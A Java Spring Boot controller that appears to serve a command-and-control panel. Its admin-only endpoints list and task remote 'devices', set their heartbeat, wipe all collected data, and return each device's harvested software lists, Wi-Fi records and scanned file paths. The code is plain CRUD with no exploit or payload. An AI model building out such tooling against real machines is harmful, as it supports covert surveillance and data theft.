package com.yupi.springbootinit.controller;

import com.baomidou.mybatisplus.extension.plugins.pagination.Page;
import com.yupi.springbootinit.common.BaseResponse;
import com.yupi.springbootinit.common.DeleteRequest;
import com.yupi.springbootinit.common.ErrorCode;
import com.yupi.springbootinit.common.ResultUtils;
import com.yupi.springbootinit.exception.BusinessException;
import com.yupi.springbootinit.exception.ThrowUtils;
import com.yupi.springbootinit.model.dto.c2Device.C2DeviceQueryRequest;
import com.yupi.springbootinit.model.entity.C2Device;
import com.yupi.springbootinit.model.entity.C2Software;
import com.yupi.springbootinit.model.entity.C2Wifi;
import com.yupi.springbootinit.model.entity.C2FileScan;
import com.yupi.springbootinit.model.vo.C2DeviceVO;
import com.yupi.springbootinit.service.C2DeviceService;
import com.yupi.springbootinit.annotation.AuthCheck;
import com.yupi.springbootinit.constant.UserConstant;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import org.apache.commons.lang3.StringUtils;
import java.util.List;

import com.yupi.springbootinit.mapper.*;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping("/c2Device")
//@Slf4j
public class C2DeviceController {

    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(C2DeviceController.class);

    @Resource
    private C2DeviceService c2DeviceService;

    @Resource
    private C2TaskMapper c2TaskMapper;

    @Resource
    private C2ScreenshotMapper c2ScreenshotMapper;

    @Resource
    private C2FileScanMapper c2FileScanMapper;

    @Resource
    private C2WifiMapper c2WifiMapper;

    @Resource
    private C2SoftwareMapper c2SoftwareMapper;

    @PostMapping("/list/page/vo")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Page<C2DeviceVO>> listC2DeviceVOByPage(@RequestBody C2DeviceQueryRequest c2DeviceQueryRequest,
                                                               HttpServletRequest request) {
        long current = c2DeviceQueryRequest.getCurrent();
        long size = c2DeviceQueryRequest.getPageSize();
        ThrowUtils.throwIf(size > 20, ErrorCode.PARAMS_ERROR);
        Page<C2Device> c2DevicePage = c2DeviceService.page(new Page<>(current, size),
                c2DeviceService.getQueryWrapper(c2DeviceQueryRequest));
        return ResultUtils.success(c2DeviceService.getC2DeviceVOPage(c2DevicePage, request));
    }

    @PostMapping("/update/heartbeat")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Boolean> updateHeartbeat(@RequestBody C2Device c2Device, HttpServletRequest request) {
        if (c2Device == null || c2Device.getId() == null || c2Device.getHeartbeatInterval() == null) {
            throw new BusinessException(ErrorCode.PARAMS_ERROR);
        }
        C2Device updateDevice = new C2Device();
        updateDevice.setId(c2Device.getId());
        updateDevice.setHeartbeatInterval(c2Device.getHeartbeatInterval());
        boolean result = c2DeviceService.updateById(updateDevice);
        ThrowUtils.throwIf(!result, ErrorCode.OPERATION_ERROR);
        return ResultUtils.success(true);
    }
    
    @PostMapping("/delete")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Boolean> deleteC2Device(@RequestBody DeleteRequest deleteRequest, HttpServletRequest request) {
        if (deleteRequest == null || deleteRequest.getId() <= 0) {
            throw new BusinessException(ErrorCode.PARAMS_ERROR);
        }
        long id = deleteRequest.getId();
        boolean result = c2DeviceService.removeById(id);
        ThrowUtils.throwIf(!result, ErrorCode.OPERATION_ERROR);
        return ResultUtils.success(true);
    }

    @PostMapping("/recover")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Boolean> recoverDevices() {
        c2DeviceService.restoreAll();
        return ResultUtils.success(true);
    }
    
    @PostMapping("/clean")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Boolean> cleanAllData() {
        // 1. Clean Database
        // For C2DeviceService (MyBatis Plus), remove(null) might not work as expected for "delete all".
        // It's safer to use a wrapper.
        c2DeviceService.remove(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        
        c2TaskMapper.delete(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        c2ScreenshotMapper.delete(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        c2FileScanMapper.delete(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        c2WifiMapper.delete(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        c2SoftwareMapper.delete(new com.baomidou.mybatisplus.core.conditions.query.QueryWrapper<>());
        
        // 2. Clean Uploads Directory
        try {
            java.io.File uploadsDir = new java.io.File("uploads");
            if (uploadsDir.exists()) {
                org.apache.commons.io.FileUtils.cleanDirectory(uploadsDir);
                // Re-create .gitignore if needed, or just keep it empty
            }
        } catch (Exception e) {
            log.error("Failed to clean uploads directory", e);
            // Don't fail the request, just log
        }
        
        return ResultUtils.success(true);
    }

    @GetMapping("/software/list")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<List<C2Software>> listSoftware(@RequestParam(value = "deviceUuid", required = false) String deviceUuid) {
        if (StringUtils.isBlank(deviceUuid)) {
            throw new BusinessException(ErrorCode.PARAMS_ERROR);
        }
        QueryWrapper<C2Software> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("device_uuid", deviceUuid);
        queryWrapper.orderByDesc("createTime");
        return ResultUtils.success(c2SoftwareMapper.selectList(queryWrapper));
    }

    @GetMapping("/wifi/list")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<List<C2Wifi>> listWifi(@RequestParam(value = "deviceUuid", required = false) String deviceUuid) {
        if (StringUtils.isBlank(deviceUuid)) {
            throw new BusinessException(ErrorCode.PARAMS_ERROR);
        }
        QueryWrapper<C2Wifi> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("device_uuid", deviceUuid);
        queryWrapper.orderByDesc("createTime");
        return ResultUtils.success(c2WifiMapper.selectList(queryWrapper));
    }

    @GetMapping("/files/list")
    @AuthCheck(mustRole = UserConstant.ADMIN_ROLE)
    public BaseResponse<Page<C2FileScan>> listFiles(
            @RequestParam(value = "deviceUuid", required = false) String deviceUuid,
            @RequestParam(value = "isRecent", required = false) Integer isRecent,
            @RequestParam(value = "pageSize", defaultValue = "20") long pageSize,
            @RequestParam(value = "current", defaultValue = "1") long current,
            @RequestParam(value = "searchText", required = false) String searchText) {
        
        if (StringUtils.isBlank(deviceUuid)) {
            throw new BusinessException(ErrorCode.PARAMS_ERROR);
        }
        
        QueryWrapper<C2FileScan> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("device_uuid", deviceUuid);
        
        if (isRecent != null) {
            queryWrapper.eq("isRecent", isRecent);
        }
        if (org.apache.commons.lang3.StringUtils.isNotBlank(searchText)) {
            queryWrapper.and(qw -> qw.like("fileName", searchText).or().like("filePath", searchText));
        }
        queryWrapper.orderByDesc("lastModified", "createTime");
        return ResultUtils.success(c2FileScanMapper.selectPage(new Page<>(current, pageSize), queryWrapper));
    }
}
